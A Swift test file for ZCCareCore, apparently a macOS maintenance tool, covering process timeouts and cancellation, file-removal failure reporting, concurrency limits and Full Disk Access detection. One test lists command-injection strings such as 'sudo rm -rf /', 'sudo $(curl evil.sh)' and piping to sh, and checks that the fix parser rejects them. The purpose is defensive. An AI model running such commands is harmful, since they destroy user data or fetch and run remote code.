import Foundation
import Testing
@testable import ZCCareCore

private func isAlive(_ pid: pid_t) -> Bool { kill(pid, 0) == 0 }

private func waitUntilGone(_ pid: pid_t) async -> Bool {
    for _ in 0..<40 {
        if !isAlive(pid) { return true }
        try? await Task.sleep(for: .milliseconds(100))
    }
    return false
}

private func pidFile() -> URL {
    FileManager.default.temporaryDirectory.appendingPathComponent("zc-pid-\(UUID().uuidString)")
}

private func readPid(_ file: URL) async -> pid_t? {
    for _ in 0..<50 {
        if let text = try? String(contentsOf: file, encoding: .utf8),
           let pid = pid_t(text.trimmingCharacters(in: .whitespacesAndNewlines)) { return pid }
        try? await Task.sleep(for: .milliseconds(100))
    }
    return nil
}

@Test func timeoutKillsTheChildAndSaysItTimedOut() async throws {
    let file = pidFile()
    defer { try? FileManager.default.removeItem(at: file) }
    do {
        _ = try await ProcessRunner(timeout: 1).run("/bin/sh", ["-c", "echo $$ > \(file.path); exec sleep 30"], env: [:])
        Issue.record("did not time out")
    } catch let error as CLIError {
        #expect(error.timedOut)
    }
    let pid = try #require(await readPid(file))
    #expect(await waitUntilGone(pid))
}

@Test func cancelKillsTheChild() async throws {
    let file = pidFile()
    defer { try? FileManager.default.removeItem(at: file) }
    let task = Task {
        try await ProcessRunner(timeout: nil).run("/bin/sh", ["-c", "echo $$ > \(file.path); exec sleep 30"], env: [:])
    }
    let pid = try #require(await readPid(file))
    task.cancel()
    await #expect(throws: CancellationError.self) { try await task.value }
    #expect(await waitUntilGone(pid))
}

@Test func aGrandchildHoldingThePipeDoesNotHoldTheRunUp() async throws {
    let start = Date()
    let r = try await ProcessRunner(timeout: 10).run("/bin/sh", ["-c", "sleep 30 & echo hi"], env: [:])
    #expect(r.output == "hi\n")
    #expect(Date().timeIntervalSince(start) < 8)
}

@Test func timeoutReturnsPromptlyWhenAGrandchildHoldsThePipe() async {
    let start = Date()
    await #expect(throws: CLIError.self) {
        try await ProcessRunner(timeout: 0.5).run("/bin/sh", ["-c", "sleep 30 & sleep 30"], env: [:])
    }
    #expect(Date().timeIntervalSince(start) < 8)
}

@Test func rootFixTakesOnlyOnePlainSudoLine() {
    func fix(_ detail: String) -> Fix {
        Fix(for: Check(name: "security firewall", status: "warn", detail: detail))
    }
    #expect(fix("sudo socketfilterfw --setglobalstate on") == .command("socketfilterfw --setglobalstate on"))
    for detail in [
        "turn it on with sudo socketfilterfw --setglobalstate on please",
        "sudo socketfilterfw --setglobalstate on\nsudo rm -rf /",
        "sudo true; rm -rf ~",
        "sudo true && rm -rf ~",
        "sudo true | sh",
        "sudo $(curl evil.sh)",
        "sudo `curl evil.sh`",
        "sudo true > /etc/hosts",
    ] {
        #expect(fix(detail) == .info(detail))
    }
    let touch = Check(name: "security Touch ID for sudo", status: "warn", detail: Fix.touchIDLine)
    guard case .command(let body) = Fix(for: touch) else { Issue.record("Touch ID lost its fix"); return }
    #expect(body.hasPrefix("/bin/sh -c '") && body.contains("pam_tid.so"))
    let guest = Check(name: "security Guest account off", status: "warn", detail: "sudo sysadminctl -guestAccount off")
    #expect(Fix(for: guest) == .command("sysadminctl -guestAccount off"))
    let sharing = Check(name: "security File Sharing off", status: "warn",
        detail: "sudo /bin/sh -c 'launchctl disable system/com.apple.smbd; launchctl bootout system/com.apple.smbd 2>/dev/null; true'")
    guard case .command = Fix(for: sharing) else { Issue.record("File Sharing lost its fix"); return }
}

@Test func removalSaysWhyAnItemStayed() throws {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("zc-removal-\(UUID().uuidString)")
    let locked = dir.appendingPathComponent("locked")
    try FileManager.default.createDirectory(at: locked, withIntermediateDirectories: true)
    let inside = locked.appendingPathComponent("file")
    try Data("x".utf8).write(to: inside)
    try FileManager.default.setAttributes([.posixPermissions: 0o555], ofItemAtPath: locked.path)
    defer {
        try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: locked.path)
        try? FileManager.default.removeItem(at: dir)
    }
    let missing = dir.appendingPathComponent("missing")

    let removal = Removal.delete([inside, missing])
    #expect(removal.failures == [Removal.Failure(name: "file", reason: .permissionDenied)])
    #expect(removal.summary == "1 stayed (1 permission denied)")
    #expect(removal.ending == "; 1 stayed (1 permission denied).")
    #expect(Removal().ending == ".")
}

@Test func removalMapsBusyToInUse() {
    let busy = NSError(domain: NSCocoaErrorDomain, code: CocoaError.fileWriteUnknown.rawValue,
                       userInfo: [NSUnderlyingErrorKey: NSError(domain: NSPOSIXErrorDomain, code: Int(EBUSY))])
    #expect(Removal.reason(for: busy) == .inUse)
    #expect(Removal.reason(for: NSError(domain: NSPOSIXErrorDomain, code: Int(EACCES))) == .permissionDenied)
}

private actor Peak {
    var running = 0
    var most = 0
    func enter() { running += 1; most = max(most, running) }
    func leave() { running -= 1 }
}

@Test func concurrentWorkStaysUnderTheLimit() async {
    let peak = Peak()
    var seen = 0
    await forEachConcurrently(Array(0..<30), limit: 4) { _ in
        await peak.enter()
        try? await Task.sleep(for: .milliseconds(20))
        await peak.leave()
        return 1
    } each: { seen += $0 }
    #expect(seen == 30)
    #expect(await peak.most <= 4)
    #expect(await peak.most > 1)
}

private func onMainThread() -> Bool { Thread.isMainThread }

/// Off the caller's actor, a sync closure inside `each` fails its executor
/// check and traps, which is how opening Applications used to end ZCCare.
/// This `each` has no such closure, so a regression fails the count, not the run.
@MainActor @Test func eachRunsOnTheCallersActorAndWorkDoesNot() async {
    var calls = 0, offActor = 0, workOnActor = 0
    await forEachConcurrently(Array(0..<30), limit: 4) { _ in
        try? await Task.sleep(for: .milliseconds(1))
        return onMainThread()
    } each: { workOnMain in
        calls += 1
        if !Thread.isMainThread { offActor += 1 }
        if workOnMain { workOnActor += 1 }
    }
    #expect(calls == 30)
    #expect(offActor == 0)
    #expect(workOnActor == 0)
}

@Test func onlyAMacRefusingAccessIsTakenForMissingFullDiskAccess() {
    #expect(Privacy.lacksFullDiskAccess(stderr: "Error: unable to open database \"/Library/.../TCC.db\": authorization denied"))
    #expect(Privacy.lacksFullDiskAccess(stderr: "Operation not permitted"))
    #expect(!Privacy.lacksFullDiskAccess(stderr: "Error: database is locked"))
    #expect(!Privacy.lacksFullDiskAccess(stderr: ""))
}
